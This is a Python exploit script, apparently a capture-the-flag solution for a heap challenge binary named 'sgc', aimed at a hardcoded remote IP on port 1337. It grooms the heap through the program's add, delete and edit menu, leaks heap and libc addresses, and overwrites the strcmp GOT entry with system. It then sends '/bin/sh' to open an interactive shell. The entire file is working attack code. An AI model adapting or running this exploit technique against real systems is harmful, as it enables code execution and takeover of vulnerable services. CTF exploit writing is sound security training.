#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './sgc'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'localhost', 'port':1337}, \
                        remote  = {'host':'35.198.176.224', 'port':1337})

env.select()

#==========

binf = ELF(bin_file)
addr_got_main       = binf.got['__libc_start_main']
addr_got_strcmp     = binf.got['strcmp']

libc = ELF('libc-2.26.so')
offset_libc_main    = libc.sep_function['__libc_start_main']

#==========

def attack(conn):
    sgc = SimpleGC(conn)

    for i in range(4):
        sgc.add_user('X'*8, 'Y'*8+str(i), 10)
        sgc.delete_user(0)

    sleep(1)

    sgc.add_user('A'*8, 'hoge', 0xdeadbeef)
    sgc.add_user('B'*8, 'fuga', 0)
    sgc.add_user('C'*8, 'piyo', 0xcafebabe)

    sgc.edit_group(0, 'fuga')
    sgc.delete_user(0)

    sleep(1)
    addr_heap = u(sgc.disp_user(1)['group']) - 0x4b0
    info('addr_heap   = 0x{:08x}'.format(addr_heap))

    sgc.edit_group(1, p64(addr_heap + 0x590))
    
    exploit  = p64(0)
    exploit += p64(addr_got_main)
    exploit += p64(addr_got_main)
    sgc.edit_group(2, 'abcd', False)
    sgc.edit_group(2, exploit, False)

    libc.address = u(sgc.disp_user(1)['name']) - offset_libc_main
    info('addr_libc   = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']

    exploit  = p64(0)
    exploit += p64(0)
    exploit += p64(addr_got_strcmp)
    sgc.edit_group(2, exploit)
    sgc.edit_group(1, p64(addr_libc_system))

    conn.sendlineafter('Action: ', '1')
    conn.sendlineafter('name: ', '/bin/sh')

class SimpleGC:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add_user(self, name, group, age):
        self.sendlineafter('Action: ', '0')
        self.sendlineafter('name: ', name)
        self.sendlineafter('group: ', group)
        self.sendlineafter('age: ', str(age))

    def disp_user(self, idx):
        user = {}

        self.sendlineafter('Action: ', '2')
        self.sendlineafter('index: ', str(idx))
        self.recvuntil('Name: ')
        user['name'] = self.recvuntil('\n', drop=True)
        self.recvuntil('Group: ')
        user['group'] = self.recvuntil('\n', drop=True)
        self.recvuntil('Age: ')
        user['age'] = self.recvuntil('\n', drop=True)

        return user

    def edit_group(self, idx, group, update_all = True):
        self.sendlineafter('Action: ', '3')
        self.sendlineafter('index: ', str(idx))
        self.sendlineafter('(y/n): ', 'y' if update_all else 'n')
        self.sendlineafter('name: ', group)

    def delete_user(self, idx):
        self.sendlineafter('Action: ', '4')
        self.sendlineafter('index: ', str(idx))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
